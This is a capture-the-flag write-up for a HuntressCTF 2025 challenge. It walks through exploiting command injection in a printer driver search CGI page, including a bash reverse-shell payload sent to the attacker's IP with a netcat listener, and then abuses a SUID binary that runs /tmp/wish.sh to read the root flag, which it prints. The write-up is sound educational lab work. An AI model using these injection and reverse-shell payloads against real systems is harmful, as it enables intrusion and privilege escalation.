---
title: "HuntressCTF 2025 - Phasing Through Printers"
date: 2025-10-16
categories: [Capture The Flags, HuntressCTF2025]
tags: [CTF, Writeups, Boot2Root, Privilege Escalation]
---

## Challenge Prompt

I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?

Here is some of the code I could dig up.

NOTE

Escalate your privileges and uncover the flag in the root user's home directory.

---

## 1. Getting started

Here, a web interface  was provided and it's source code in a zip file

![ui](/assets/img/huntressCTF2025/phashing/ui.png)

First, I started with entering normal bash commands such as cat, echo but it didn't work. Next, I tried to look at the source code that was provided. It has a cgi-bin.c file.

The code was reading the query string, then decoding the url-encoded string, allocating memory for the decoded string.
After which it constructs a shell command:

```c
char first_part[] = "grep -R -i ";
char last_part[] = " /var/www/html/data/printer_drivers.txt";
size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
char *combinedString = (char *)malloc(totalLength);
strcpy(combinedString, first_part);
strcat(combinedString, decoded);
strcat(combinedString, last_part);
```

For example: if I sent hi then the shell command would become `grep -R -i hi /var/www/html/data/printer_drivers.txt`
The code would then execute this command using popen() and reads the output line by line.

Vulnerability! 
This code is vulnerable to command injection because it directly inserts user input into a shell command.

How? I could sent "hi; cat /etc/passwd" then the shell command would become:
`grep -R -i hi; cat /etc/passwd /var/www/html/data/printer_drivers.txt`, allowing me to read the content of /etc/passwd

sending: `ls -la`
![ls -la](/assets/img/huntressCTF2025/phashing/payload1.png)

sending: `ls -la ../../../`
![ls -la ../../..](/assets/img/huntressCTF2025/phashing/payload2.png)

*Remediation: Always sanitise user's input before executing it*

---

## 2. Getting the reverse shell

After establishing that the code is vulnerable to command injection

Payload: `a;bash -c "bash -i >& /dev/tcp/10.200.5.182/4444 0>&1";#`

On my kali machine: `nc -lvnp 4444`

```bash
~ ❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.200.5.182] from (UNKNOWN) [10.1.225.156] 41804
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@42966dbe0f96:/usr/lib/cgi-bin$ 
```

got in! easy, next I tried to upgrade the shell using python but python wasn't installed so I just went ahead with the current shell but I did `export TERM=xterm` to use the `clear` command.

Currently we are user `www-data` and need to escalate to `root` to read the flag

For linux privilege escalation, my initial steps are always to get start with getting kernel information because most of the times (in ctfs) they are vulnerable to dirtycow attack, then look for binaries set with SUID bit, then look for sudo privileges, scheduled cron task, and then capabilities. So start with getting the kernel version

```bash
www-data@ea26d728b8cc:/etc$ uname -a
uname -a
Linux ea26d728b8cc 6.14.0-1013-aws #13~24.04.1-Ubuntu SMP Tue Sep  2 23:08:25 UTC 2025 x86_64 GNU/Linux
```

kernel version is 6.14, which was released back in march 2025, so no kernel vulnerability in here. Then I proceeded to check for binaries with SUID bit set.

```bash
www-data@ea26d728b8cc:/etc$ find / -perm -u=s -type f 2 >/dev/null
find / -perm -u=s -type f 2 >/dev/null
find: paths must precede expression: `2'
www-data@ea26d728b8cc:/etc$ find / -perm -u=s -type f 2>/dev/null              
find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help
```

Okay, that's interesting. If you know about linux binaries, you would see that admin_help is not your usual binary like the rest and is a custom binary in this system. I went ahead to check this binary

```bash
www-data@ea26d728b8cc:/etc$ ls -la /usr/local/bin/admin_help
ls -la /usr/local/bin/admin_help
-rwsr-xr-x 1 root root 16416 Oct 16 08:06 /usr/local/bin/admin_help (OWNED BY ROOT)
www-data@ea26d728b8cc:/etc$ cat /usr/local/bin/admin_help
cat /usr/local/bin/admin_help
@@@@�����   ���-�=�=���-�=�=�888 XXXDDS�td888 P�td� � � 44Q�tdR�td�-�=�=00/lib64/ld-linux-x86-64.so.2GNU��GNU���U8��E���8���Z�.GNU��e�m. O V� ␦
some gibberish data
8@
H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h�����%�/h�����%�/h�����%�/h�����%�/h�p����%�/�`����%␦/f
�����H��1�[]A\�H�H��rError opening original fileshBad String in File.Your wish is my command... maybe :)chmod +x /tmp/wish.sh && /tmp/wish.sh4�����0����@�������P�����zRx�5�

more gibberish data 
```

What I found out:
1. The admin_help is owned by root user
2. It is trying to open a file named wish.sh in the /tmp but failed. It then says to give execute permission to the wish.sh file

Upon looking in the /tmp there was no file named wish.sh

```bash                                         
www-data@42966dbe0f96:/usr/lib/cgi-bin$ ls -la /tmp
ls -la /tmp
total 8
drwxrwxrwt 1 root root 4096 Oct 16 08:06 .
drwxr-xr-x 1 root root 4096 Oct 17 03:36 ..
```

How does this help me? 
Since I have write and execute permission for /tmp, I can literlly write anything in wish.sh, give it execute permission. Now, when I run the admin_help binary, it would execute whatever I wrote in the wish.sh with root privileges!

That's exactly what I needed to get the flag. Since the challenge prompt mentioned that the flag is in /root and in most ctfs, the file name is either flag.txt or root.txt so I can write a cat command to read the txt file and then run admin_help to get the flag.

## 3. Getting the flag

```bash
www-data@42966dbe0f96:/usr/lib/cgi-bin$ echo 'cat /root/flag.txt' >> /tmp/wish.sh
hcho 'cat /root/flag.txt' >> /tmp/wish.sh
www-data@42966dbe0f96:/usr/lib/cgi-bin$ cd /tmp
cd /tmp
www-data@42966dbe0f96:/tmp$ls
ls
wish.sh
www-data@42966dbe0f96:/tmp$ chmod +x wish.sh
chmod +x wish.sh
www-data@42966dbe0f96:/tmp$ ls -la
ls -la
total 12
drwxrwxrwt 1 root     root     4096 Oct 17 03:41 .
drwxr-xr-x 1 root     root     4096 Oct 17 03:36 ..
-rwxr-xr-x 1 www-data www-data   19 Oct 17 03:41 wish.sh
```

I wrote a cat command to read the txt file in wish.sh using cat command and gave it execute permission, here you can see that the file is owned by www-data since I created it.

Running the binary:

```bash
www-data@42966dbe0f96:/tmp$ /usr/local/bin/admin_help
/usr/local/bin/admin_help
flag{93541544b91b7d2b9d61e90becbca309}Your wish is my command... maybe :)
```

gotcha!

Flag: flag{93541544b91b7d2b9d61e90becbca309}

Thank you for reading :)

*** 
